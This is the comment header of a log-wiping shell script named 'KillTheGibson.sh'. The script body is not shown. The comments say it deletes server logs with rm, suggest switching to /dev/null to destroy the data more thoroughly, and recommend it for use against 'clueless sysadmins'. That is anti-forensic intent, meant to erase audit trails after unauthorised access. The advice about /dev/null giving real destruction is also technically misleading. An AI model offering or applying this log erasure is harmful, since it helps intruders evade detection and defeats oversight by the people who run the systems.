# Public version of KillTheGibson.sh shell script which rm's logs. 
# The rm command utilizes the unlink system call, which does not destroy data just removes the link to the data.
# The logs are still on the partition, but the pointer to the data has been removed.
# If you REALLY want to destroy log data, I suggest editing the script to use /dev/null instead of rm.
# However this is nice and easy for personal servers and clueless sysadmins ^__^
